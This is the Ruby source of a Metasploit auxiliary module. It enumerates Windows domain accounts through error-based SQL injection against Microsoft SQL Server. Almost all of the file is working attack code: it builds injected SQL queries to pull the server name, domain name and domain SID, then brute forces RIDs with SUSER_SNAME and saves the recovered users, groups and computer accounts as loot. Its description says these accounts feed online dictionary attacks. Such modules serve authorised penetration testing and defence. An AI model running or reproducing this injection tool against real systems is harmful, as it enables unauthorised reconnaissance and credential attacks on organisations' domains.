##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL_SQLI
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration',
      'Description' => %q{
        This module can be used to bruteforce RIDs associated with the domain of the SQL Server
        using the SUSER_SNAME function via Error Based SQL injection. This is similar to the
        smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC
        role (everyone). Information that can be enumerated includes Windows domain users, groups,
        and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.
        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
      },
      'Author'         =>
        [
          'nullbind <scott.sutherland[at]netspi.com>',
          'antti <antti.rantasaari[at]netspi.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  => [[ 'URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
      ))

    register_options(
    [
      OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),
      OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])
    ])
  end

  def run
    print_status("Grabbing the SQL Server name and domain...")
    db_server_name = get_server_name
    if db_server_name.nil?
      print_error("Unable to grab the server name")
      return
    else
      print_good("Server name: #{db_server_name}")
    end

    db_domain_name = get_domain_name
    if db_domain_name.nil?
      print_error("Unable to grab domain name")
      return
    end

    # Check if server is on a domain
    if db_server_name == db_domain_name
      print_error("The SQL Server does not appear to be part of a Windows domain")
      return
    else
      print_good("Domain name: #{db_domain_name}")
    end

    print_status("Grabbing the SID for the domain...")
    windows_domain_sid = get_windows_domain_sid(db_domain_name)
    if windows_domain_sid.nil?
      print_error("Could not recover the SQL Server's domain sid.")
      return
    else
      print_good("Domain sid: #{windows_domain_sid}")
    end

    # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
    total_rids = datastore['END_RID'] - datastore['START_RID']
    print_status("Brute forcing #{total_rids} RIDs via SQL injection, be patient...")
    domain_users = get_win_domain_users(windows_domain_sid)
    if domain_users.nil?
      print_error("Sorry, no Windows domain accounts were found, or DC could not be contacted.")
      return
    end

    # Print number of objects found and write to a file
    print_good("#{domain_users.length} user accounts, groups, and computer accounts were found.")

    # Create table for report
    windows_domain_login_table = Rex::Text::Table.new(
      'Header'  => 'Windows Domain Accounts',
      'Ident'   => 1,
      'Columns' => ['name']
    )

    # Add brute forced names to table
    domain_users.each do |object_name|
      windows_domain_login_table << [object_name]
    end

    print_line(windows_domain_login_table.to_s)

    # Create output file
    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv"
    path = store_loot(
      'mssql.domain.accounts',
      'text/plain',
      datastore['RHOST'],
      windows_domain_login_table.to_csv,
      filename,
      'SQL Server query results'
    )
    print_status("Query results have been saved to: #{path}")
  end

  # Get the server name
  def get_server_name
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+@@servername+'#{clue_end}')"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      instance_name = $1
      sql_server_name = instance_name.split('\\')[0]
    else
      sql_server_name = nil
    end

    sql_server_name
  end

  # Get the domain name of the SQL Server
  def get_domain_name
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+DEFAULT_DOMAIN()+'#{clue_end}')"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      domain_name = $1
    else
      domain_name = nil
    end

    domain_name
  end

  # Get the SID for the domain
  def get_windows_domain_sid(db_domain_name)
    domain_group = "#{db_domain_name}\\Domain Admins"

    clue_start = Rex::Text.rand_text_alpha(8)
    clue_end = Rex::Text.rand_text_alpha(8)

    sql = "(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('#{domain_group}')))), 1, 2, ''))+'#{clue_end}' as int))"

    result = mssql_query(sql)

    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      object_sid = $1
      domain_sid = object_sid[0..47]
      return nil if domain_sid.empty?
    else
      domain_sid = nil
    end

    domain_sid
  end

  # Get list of windows accounts, groups and computer accounts
  def get_win_domain_users(domain_sid)
    clue_start = Rex::Text.rand_text_alpha(8)
    clue_end = Rex::Text.rand_text_alpha(8)

    windows_logins = []

    total_rids = datastore['END_RID'] - datastore['START_RID']
    # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function
    (datastore['START_RID']..datastore['END_RID']).each do |principal_id|
      rid_diff = principal_id - datastore['START_RID']
      if principal_id % 100 == 0
        print_status("#{rid_diff} of #{total_rids } RID queries complete")
      end

       user_sid = build_user_sid(domain_sid, principal_id)

      # Return if sid does not resolve correctly for a domain
      if user_sid.length < 48
        return nil
      end

      sql = "(SELECT '#{clue_start}'+(SELECT SUSER_SNAME(#{user_sid}) as name)+'#{clue_end}')"

      result = mssql_query(sql)

      if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
        windows_login = $1

        unless windows_login.empty? || windows_logins.include?(windows_login)
          windows_logins.push(windows_login)
          print_good(" #{windows_login}")
        end
      end

    end

    windows_logins
  end

  def build_user_sid(domain_sid, rid)
    # Convert number to hex and fix order
    principal_id = "%02X" % rid
    principal_id = principal_id.size.even? ? principal_id : "0#{principal_id}"
    principal_id  = principal_id.scan(/(..)/).reverse.join
    # Add padding
    principal_id = principal_id.ljust(8, '0')

    # Create full sid
    "0x#{domain_sid}#{principal_id}"
  end
end
